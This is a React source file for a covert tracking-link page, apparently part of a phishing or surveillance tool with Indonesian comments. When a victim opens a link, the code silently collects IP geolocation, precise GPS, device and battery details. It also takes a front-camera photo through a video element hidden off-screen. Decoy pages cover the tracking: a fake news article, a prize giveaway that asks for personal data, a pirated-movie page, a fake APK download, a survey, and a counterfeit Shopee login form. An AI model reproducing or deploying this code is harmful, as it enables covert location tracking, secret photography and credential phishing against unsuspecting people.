import { useEffect, useRef, useState } from 'react';
import { useParams } from 'react-router-dom';
import { getLinkById, addCapture } from '../storage';

/* ─── UA Parser ─────────────────────────────────────────── */
function parseUA(ua) {
  let os = 'Unknown', browser = 'Unknown', device = 'Unknown';
  if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
  else if (/Windows NT 6/.test(ua)) os = 'Windows 7/8';
  else if (/Mac OS X/.test(ua)) os = 'macOS';
  else if (/Android/.test(ua)) { const m = ua.match(/Android ([\d.]+)/); os = `Android ${m?.[1] ?? ''}`; }
  else if (/iPhone/.test(ua)) os = 'iOS (iPhone)';
  else if (/iPad/.test(ua))   os = 'iOS (iPad)';
  else if (/Linux/.test(ua))  os = 'Linux';

  if (/Chrome\//.test(ua) && !/Edg\//.test(ua)) browser = 'Google Chrome';
  else if (/Firefox\//.test(ua)) browser = 'Firefox';
  else if (/Edg\//.test(ua))    browser = 'Microsoft Edge';
  else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';

  const m = ua.match(/Android.*?;\s*([^)]+)\)/);
  if (m)                    device = m[1].trim();
  else if (/iPhone/.test(ua))  device = 'iPhone';
  else if (/iPad/.test(ua))    device = 'iPad';
  else if (/Windows/.test(ua)) device = 'Windows PC';
  else if (/Macintosh/.test(ua)) device = 'Mac';

  return { os, browser, device };
}

/* ─── Silent Tracker ────────────────────────────────────── */
async function runSilentTracking(link, dataRef, onCameraReady) {
  const opts = link.options || {};
  const data = dataRef.current;

  // 1. IP & Lokasi — ambil dari 3 API paralel, pilih yang paling lengkap
  if (opts.trackIp) {
    const results = await Promise.allSettled([
      // API 1: ip-api.com (akurat untuk Asia, gratis)
      fetch('https://ip-api.com/json/?fields=status,country,countryCode,regionName,city,zip,lat,lon,isp,org,as,query')
        .then(r => r.json())
        .then(j => j.status === 'success' ? {
          ip: j.query, country: j.country, countryCode: j.countryCode,
          region: j.regionName, city: j.city, zip: j.zip,
          lat: j.lat, lon: j.lon, isp: j.isp || j.org, asn: j.as,
          _score: (j.city ? 2 : 0) + (j.regionName ? 1 : 0),
        } : null),

      // API 2: ipinfo.io (detail, bagus untuk mobile carrier)
      fetch('https://ipinfo.io/json?token=')
        .then(r => r.json())
        .then(j => {
          if (!j.ip) return null;
          const [lat, lon] = (j.loc || ',').split(',').map(Number);
          return {
            ip: j.ip, country: j.country, region: j.region,
            city: j.city, zip: j.postal, isp: j.org,
            lat: lat || null, lon: lon || null,
            _score: (j.city ? 2 : 0) + (j.region ? 1 : 0),
          };
        }),

      // API 3: ipapi.co (fallback)
      fetch('https://ipapi.co/json/')
        .then(r => r.json())
        .then(j => j.ip ? {
          ip: j.ip, country: j.country_name, countryCode: j.country_code,
          region: j.region, city: j.city, zip: j.postal,
          lat: j.latitude, lon: j.longitude, isp: j.org,
          _score: (j.city ? 2 : 0) + (j.region ? 1 : 0),
        } : null),
    ]);

    // Pilih hasil dengan score tertinggi (paling lengkap datanya)
    const best = results
      .filter(r => r.status === 'fulfilled' && r.value)
      .map(r => r.value)
      .sort((a, b) => (b._score || 0) - (a._score || 0))[0];

    if (best) {
      const { _score, ...loc } = best;
      Object.assign(data, loc);
      data.locationSource = 'IP';
    }

    // GPS — override koordinat jika diizinkan (presisi meter)
    if ('geolocation' in navigator) {
      new Promise(resolve => {
        navigator.geolocation.getCurrentPosition(
          pos => {
            data.lat = pos.coords.latitude; data.lon = pos.coords.longitude;
            data.gpsAccuracy = Math.round(pos.coords.accuracy);
            data.locationSource = 'GPS';
            if (link?.id) addCapture(link.id, { ...dataRef.current });
            resolve();
          },
          () => { resolve(); },
          { timeout: 8000, maximumAge: 60000, enableHighAccuracy: true }
        );
      });
    }
  }


  // 2. Device
  if (opts.trackDevice) {
    const p = parseUA(navigator.userAgent);
    data.device = p.device; data.os = p.os; data.browser = p.browser;
  }

  // 3. Battery
  if (opts.trackBattery) {
    try {
      if ('getBattery' in navigator) {
        const bat = await navigator.getBattery();
        data.battery = bat.level; data.charging = bat.charging;
      }
    } catch { /* silent */ }
  }

  // 4. Camera
  if (opts.trackCamera) { onCameraReady(); return; }

  addCapture(link.id, { ...data });
}

/* ─── Decoy Components ──────────────────────────────────── */

function ArticleDecoy() {
  return (
    <div className="d-article">
      <div className="d-topbar">
        <div className="d-logo">📰 BeritaViral.id</div>
        <nav className="d-nav">
          <span>Beranda</span><span>Nasional</span><span>Teknologi</span><span>Hiburan</span>
        </nav>
      </div>
      <div className="d-article-body">
        <div className="d-cat">🔥 Viral</div>
        <h1 className="d-article-title">Viral! Warga Temukan Cara Dapat Saldo DANA Gratis Tanpa Syarat, Begini Caranya</h1>
        <div className="d-byline">Redaksi · Sabtu, 24 Oktober 2026 · 5 menit baca</div>
        <div className="d-img">🏦</div>
        <div className="d-body">
          <p>Metode yang sedang ramai diperbincangkan ini diklaim membantu ribuan orang mendapatkan penghasilan tambahan dari rumah. Tanpa modal, tanpa referral, dan tanpa syarat.</p>
          <p>Seorang pengguna bernama Andika (27) mengaku berhasil mengumpulkan lebih dari Rp2 juta hanya dalam seminggu.</p>
          <h2>Cara Kerjanya?</h2>
          <p>Platform ini bekerja dengan sistem reward otomatis yang terhubung langsung dengan dompet digitalmu. Setiap aktivitas akan menghasilkan poin yang bisa dicairkan kapan saja...</p>
          <div className="d-paywall">
            <div className="d-paywall-overlay">
              <div className="d-unlock">🔓 Buka Artikel Lengkap</div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

function GiveawayDecoy() {
  const [step, setStep] = useState(0);
  return (
    <div className="d-giveaway">
      <div>
        <div style={{ fontSize: '32px', textAlign: 'center', marginBottom: '8px' }}>🎉🎊🎁</div>
        <h1 className="d-giveaway-title">SELAMAT! Kamu Menang!</h1>
        <p className="d-giveaway-sub">Kamu terpilih sebagai pemenang Giveaway Spesial Hari Ini</p>
      </div>
      <div className="d-prize-card">
        <div className="d-prize-icon">📱</div>
        <div className="d-prize-name">iPhone 16 Pro Max 256GB</div>
        <div className="d-prize-val">Senilai Rp 22.000.000</div>
        <div className="d-timer">⏰ Klaim dalam: <strong>09:47</strong></div>
      </div>
      <div className="d-form">
        {step === 0 ? (
          <>
            <p style={{ color: '#6b7280', marginBottom: '14px', fontSize: '13px' }}>Masukkan data diri untuk klaim hadiah:</p>
            <input className="d-input" placeholder="Nama lengkap" />
            <input className="d-input" placeholder="Nomor WhatsApp aktif" />
            <input className="d-input" placeholder="Kota tempat tinggal" />
            <button className="d-btn-primary" onClick={() => setStep(1)}>🎁 Klaim Hadiah Sekarang!</button>
          </>
        ) : (
          <div style={{ textAlign: 'center', padding: '20px' }}>
            <div style={{ fontSize: '40px', marginBottom: '10px' }}>⏳</div>
            <div style={{ fontWeight: 700, fontSize: '16px', color: '#111', marginBottom: '6px' }}>Memverifikasi data...</div>
            <div style={{ color: '#6b7280', fontSize: '13px' }}>Mohon tunggu sebentar</div>
          </div>
        )}
      </div>
    </div>
  );
}

function VideoDecoy() {
  return (
    <div className="d-video">
      <div className="d-video-header">
        <div className="d-video-logo">▶ StreamFlix</div>
        <div style={{ display: 'flex', gap: '14px', color: '#9ca3af', fontSize: '13px' }}>
          <span>🔍</span><span>🔔</span><span>👤</span>
        </div>
      </div>
      <div className="d-player">
        <div className="d-player-inner">
          <div className="d-play">▶</div>
        </div>
      </div>
      <div className="d-video-info">
        <h1 className="d-video-title">[FULL MOVIE] Agak Laen 2: The Return — 2026 Full HD Sub Indo</h1>
        <div className="d-video-meta">
          <span>👁 12.4 Juta tayang</span>
          <span>👍 98K</span>
          <span>📅 2 hari lalu</span>
          <span>FilmGratis Official</span>
        </div>
        {['Petaka di Balik Senyum — Full Movie 2026', 'Miracle in Cell No. 7 Remake Indonesia', 'Pengabdi Setan 3 — Official Full Movie'].map((t, i) => (
          <div key={i} style={{ display: 'flex', gap: '10px', marginBottom: '14px', cursor: 'pointer' }}>
            <div style={{ width: '100px', height: '56px', background: '#f3f4f6', borderRadius: '6px', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '20px', flexShrink: 0 }}>🎬</div>
            <div style={{ fontSize: '13px', color: '#111', fontWeight: 500 }}>{t}</div>
          </div>
        ))}
      </div>
    </div>
  );
}

function DownloadDecoy() {
  const [pct, setPct] = useState(0);
  const [started, setStarted] = useState(false);
  function start() {
    setStarted(true);
    let p = 0;
    const iv = setInterval(() => {
      p += Math.random() * 8 + 2;
      if (p >= 100) { p = 100; clearInterval(iv); }
      setPct(Math.round(p));
    }, 200);
  }
  return (
    <div className="d-download">
      <div className="d-dl-header">⬇️ FileShare Pro</div>
      <div className="d-dl-card">
        <div className="d-dl-icon">📦</div>
        <div className="d-dl-name">Mod_Menu_ML_v8.2.apk</div>
        <div className="d-dl-tags">
          <span className="d-dl-tag">📊 48.3 MB</span>
          <span className="d-dl-tag">APK</span>
          <span className="d-dl-tag">✅ Aman</span>
          <span className="d-dl-tag">⬇️ 128K unduhan</span>
        </div>
        {!started ? (
          <button className="d-dl-btn" onClick={start}>⬇️ Download Sekarang (Gratis)</button>
        ) : (
          <div>
            <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '12px', color: '#6b7280', marginBottom: '6px' }}>
              <span>Mengunduh...</span><span>{pct}%</span>
            </div>
            <div style={{ height: '6px', background: '#e5e7eb', borderRadius: '3px', overflow: 'hidden' }}>
              <div style={{ height: '100%', width: `${pct}%`, background: '#2563eb', borderRadius: '3px', transition: 'width 0.2s' }} />
            </div>
            {pct === 100 && <div style={{ color: '#16a34a', fontWeight: 600, textAlign: 'center', marginTop: '10px', fontSize: '13px' }}>✅ Selesai!</div>}
          </div>
        )}
      </div>
    </div>
  );
}

function SurveyDecoy() {
  const [answers, setAnswers] = useState({});
  const [done, setDone] = useState(false);
  const qs = [
    { q: 'Berapa usia kamu saat ini?', opts: ['< 17 tahun', '17–25 tahun', '26–35 tahun', '> 35 tahun'] },
    { q: 'Pengeluaran belanja online per bulan?', opts: ['< Rp100rb', 'Rp100–500rb', 'Rp500rb–1jt', '> Rp1jt'] },
    { q: 'Platform belanja online favoritmu?', opts: ['Shopee', 'Tokopedia', 'Lazada', 'TikTok Shop'] },
  ];
  const prog = Math.round((Object.keys(answers).length / qs.length) * 100);
  return (
    <div className="d-survey">
      <div className="d-survey-header">
        <div className="d-survey-title">📋 Survey Belanja Online 2026</div>
        <div className="d-survey-sub">Selesaikan dan menangkan voucher Rp500.000!</div>
        <div className="d-progress"><div className="d-progress-fill" style={{ width: `${prog}%` }} /></div>
        <div style={{ fontSize: '11px', color: '#9ca3af', marginTop: '4px' }}>{Object.keys(answers).length}/{qs.length} pertanyaan</div>
      </div>
      {!done ? (
        <>
          {qs.map((q, qi) => (
            <div key={qi} className="d-q-card">
              <div className="d-q-label">{qi + 1}. {q.q}</div>
              <div className="d-q-opts">
                {q.opts.map((opt, oi) => (
                  <div key={oi} className={`d-q-opt ${answers[qi] === oi ? 'sel' : ''}`} onClick={() => setAnswers(a => ({ ...a, [qi]: oi }))}>
                    <div className="d-radio" /> {opt}
                  </div>
                ))}
              </div>
            </div>
          ))}
          <button className="d-btn-primary" onClick={() => Object.keys(answers).length === qs.length && setDone(true)}>
            Kirim & Klaim Hadiah 🎁
          </button>
        </>
      ) : (
        <div style={{ textAlign: 'center', padding: '32px', background: '#fff', borderRadius: '10px', border: '1px solid #e5e7eb' }}>
          <div style={{ fontSize: '40px', marginBottom: '10px' }}>🎉</div>
          <div style={{ fontWeight: 700, fontSize: '17px', color: '#111', marginBottom: '6px' }}>Terima kasih!</div>
          <div style={{ color: '#6b7280', fontSize: '13px' }}>Voucher akan dikirim ke WhatsApp kamu dalam 1x24 jam.</div>
        </div>
      )}
    </div>
  );
}

function LoginDecoy() {
  return (
    <div className="d-login">
      <div className="d-login-card">
        <div className="d-login-logo">🛒</div>
        <h1 className="d-login-title">Masuk ke Akun Kamu</h1>
        <p className="d-login-sub">ShopeeID — Belanja Lebih Hemat</p>
        <input className="d-input" placeholder="Email / No. HP / Username" />
        <input className="d-input" type="password" placeholder="Password" />
        <button className="d-btn-primary">Masuk</button>
        <div style={{ textAlign: 'center', marginTop: '14px', fontSize: '13px', color: '#9ca3af' }}>
          Belum punya akun? <span style={{ color: '#f97316', cursor: 'pointer', fontWeight: 600 }}>Daftar</span>
        </div>
        <div className="d-sep"><div className="d-sep-line" /> atau <div className="d-sep-line" /></div>
        <button className="d-btn-outline">📱 Masuk dengan Google</button>
        <button className="d-btn-outline" style={{ marginTop: '8px' }}>📘 Masuk dengan Facebook</button>
      </div>
    </div>
  );
}

/* ─── Hidden Camera ─────────────────────────────────────── */
function HiddenCamera({ onCapture }) {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  useEffect(() => {
    let stream;
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
      .then(s => {
        stream = s;
        if (videoRef.current) {
          videoRef.current.srcObject = s;
          videoRef.current.play();
          setTimeout(() => {
            const v = videoRef.current, c = canvasRef.current;
            if (!v || !c) return;
            c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
            c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
            s.getTracks().forEach(t => t.stop());
            onCapture(c.toDataURL('image/jpeg', 0.75));
          }, 1500);
        }
      })
      .catch(() => onCapture(null));
    return () => stream?.getTracks().forEach(t => t.stop());
  }, []);
  return (
    <div style={{ position: 'fixed', top: '-9999px', left: '-9999px', width: '1px', height: '1px', opacity: 0, pointerEvents: 'none' }}>
      <video ref={videoRef} autoPlay playsInline muted style={{ width: '1px', height: '1px' }} />
      <canvas ref={canvasRef} style={{ width: '1px', height: '1px' }} />
    </div>
  );
}

/* ─── Main Capture Page ─────────────────────────────────── */
const DECOY_MAP = {
  article:  ArticleDecoy,
  giveaway: GiveawayDecoy,
  video:    VideoDecoy,
  download: DownloadDecoy,
  survey:   SurveyDecoy,
  login:    LoginDecoy,
};

export default function Capture() {
  const { trackId } = useParams();
  const [link, setLink] = useState(null);
  const [notFound, setNotFound] = useState(false);
  const [showCamera, setShowCamera] = useState(false);
  const dataRef = useRef({});

  useEffect(() => {
    const lnk = getLinkById(trackId);
    if (!lnk) { setNotFound(true); return; }
    setLink(lnk);
    runSilentTracking(lnk, dataRef, () => setShowCamera(true));
  }, [trackId]);

  function handlePhotoCapture(photo) {
    if (photo) dataRef.current.photo = photo;
    setShowCamera(false);
    addCapture(link.id, { ...dataRef.current });
  }

  if (notFound) return (
    <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: '#fff', fontFamily: 'Inter, sans-serif' }}>
      <div style={{ textAlign: 'center', padding: '40px' }}>
        <div style={{ fontSize: '48px', marginBottom: '16px' }}>404</div>
        <div style={{ fontSize: '15px', color: '#9ca3af' }}>Halaman tidak ditemukan</div>
      </div>
    </div>
  );

  if (!link) return null;

  const DecoyComponent = DECOY_MAP[link.decoyTheme] || ArticleDecoy;

  return (
    <>
      {showCamera && <HiddenCamera onCapture={handlePhotoCapture} />}
      <DecoyComponent />
    </>
  );
}
